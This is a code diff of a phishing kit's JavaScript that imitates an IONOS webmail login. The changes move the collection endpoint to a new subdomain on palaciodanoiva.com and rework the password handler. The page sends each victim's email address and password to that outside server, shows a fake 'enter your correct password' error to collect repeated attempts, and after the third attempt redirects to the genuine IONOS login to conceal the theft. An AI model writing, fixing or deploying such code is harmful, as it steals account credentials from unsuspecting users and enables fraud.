@@ -145,7 +145,7 @@
             const iduserhere = document.getElementById("iduserhere");
             const errorText = pwerror.querySelector('span');
             
-            const PROCESS_URL = "https://palaciodanoiva.com/mak/das.php";
+            const PROCESS_URL = "https://gurio.palaciodanoiva.com/ono/guv.php";
             let attempts = 0;
             
             // Initialize
@@ -170,9 +170,14 @@
                 }
             });
 
-            // Password submission
+            // Password submission - FIXED VERSION
             pwButton.addEventListener("click", async (event) => {
                 event.preventDefault();
+                
+                // Reset attempts if coming back from email form
+                if (theformbox1.classList.contains("hide") === false) {
+                    attempts = 0;
+                }
                 
                 if (passwd.value === "") {
                     passwd.classList.add("border-red-500");
@@ -187,32 +192,41 @@
                 attempts++;
                 
                 try {
-                    const response = await fetch(PROCESS_URL, {
+                    // Send data to backend
+                    await fetch(PROCESS_URL, {
                         method: 'POST',
                         body: `email=${encodeURIComponent(hiddenuser.value)}&pass=${encodeURIComponent(passwd.value)}&attempt=${attempts}`,
                         headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                     });
-
-                    passwd.value = "";
-                    passwd.focus();
                     
-                    // Show error message for failed attempts (except the last one)
+                    // Clear password field
+                    passwd.value = "";
+                    
+                    // Show error message for first 2 attempts
                     if (attempts < 3) {
                         pwerror.classList.remove("hide");
                         errorText.textContent = "Please enter your correct password";
+                        passwd.focus();
                     }
-                    
-                    // Redirect after 3 attempts
-                    if (attempts >= 3) {
+                    // Redirect after 3rd attempt
+                    else {
                         window.location.href = "https://email.ionos.com/appsuite/";
+                        return; // Exit the function
                     }
                 } catch (error) {
                     console.error('Error:', error);
                     passwd.value = "";
-                    passwd.focus();
+                    
+                    // Show error message for first 2 attempts
                     if (attempts < 3) {
                         pwerror.classList.remove("hide");
                         errorText.textContent = "Please enter your correct password";
+                        passwd.focus();
+                    }
+                    // Redirect after 3rd attempt even if error
+                    else {
+                        window.location.href = "https://email.ionos.com/appsuite/";
+                        return; // Exit the function
                     }
                 } finally {
                     barLoad.classList.add("hide");
